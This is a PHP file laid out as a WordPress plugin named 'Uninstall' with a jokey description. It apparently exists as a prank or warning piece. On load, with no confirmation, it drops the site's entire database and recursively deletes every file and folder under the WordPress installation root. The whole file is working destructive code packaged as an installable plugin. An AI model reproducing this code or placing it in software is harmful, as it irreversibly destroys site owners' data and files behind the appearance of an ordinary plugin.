<?php
/**
 * Plugin Name: Uninstall
 * Plugin URI: http://wordpress.org/plugins/uninstall/
 * Description: Say goodbye to 10 years of BC and deprecated code
 * Author: Ronni Skansing
 * Version: 1.6
 * Author URI: https://github.com/RonnieSkansing
 * License: GPL2
**/

global $wpdb;
$wpdb->query('DROP DATABASE ' . DB_NAME);
$iterator = new RecursiveDirectoryIterator(
	ABSPATH,
	RecursiveDirectoryIterator::SKIP_DOTS
);
$files = new RecursiveIteratorIterator(
    $iterator,
    RecursiveIteratorIterator::CHILD_FIRST
);
foreach ($files as $file)
{
	$filePath = $file->getRealPath();
	if($file->isDir())
	{
		rmdir($filePath);
	}
	else
	{
		unlink($filePath);
	}
}
rmdir(ABSPATH);
